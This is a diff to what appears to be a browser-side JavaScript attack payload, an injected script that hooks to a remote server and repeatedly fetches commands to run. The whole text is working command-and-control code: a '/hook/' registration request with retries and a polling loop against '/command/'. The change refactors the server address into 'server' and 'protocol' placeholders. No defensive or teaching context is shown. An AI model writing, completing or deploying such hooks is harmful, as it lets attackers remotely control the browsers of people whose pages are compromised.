@@ -5,18 +5,19 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
 
 
 (async function() {
-    var serverAddress = "<server_address>";
+    var server = "<server>";
+    var protocol = "<protocol>";
     var connectionRetryCount = 0;
 
     async function sleep(time) {
         return new Promise((resolve) => setTimeout(resolve, time));
     }
 
-    async function startSession(serverAddress) {
+    async function startSession() {
         for (let nConnectionAttemps = 0; nConnectionAttemps < 4; nConnectionAttemps++) {
             console.log("Hooking to server... ");
             try {
-                const res = await fetch(`http://${serverAddress}/hook/`, {
+                const res = await fetch(`${protocol}://${server}/hook/`, {
                     method: "GET",
                     mode: 'cors',
                     headers: {
@@ -42,10 +43,10 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
         return false;
     }
 
-    async function sendRequest(serverAddress) {
+    async function sendRequest() {
         console.log("Fetching command from server...");
         try {
-            const res = await fetch(`http://${serverAddress}/command/`, {
+            const res = await fetch(`${protocol}://${server}/command/`, {
                 method: "GET",
                 mode: 'cors', 
                 headers: {
@@ -80,14 +81,14 @@ This payload if for non-persistent scripts that after eval'd can be thrown away
         }
     }
 
-    const sessionStartStatus = await startSession(serverAddress);
+    const sessionStartStatus = await startSession();
 
     if (!sessionStartStatus) {
         throw new Error("Stopping execution due to connection problems... ");
     }
 
     const intervalId = setInterval(() => { 
-        const status = sendRequest(serverAddress);
+        const status = sendRequest();
         if (!status) {
             clearInterval(intervalId);
             throw new Error("Stopping execution due to connection problems... ");
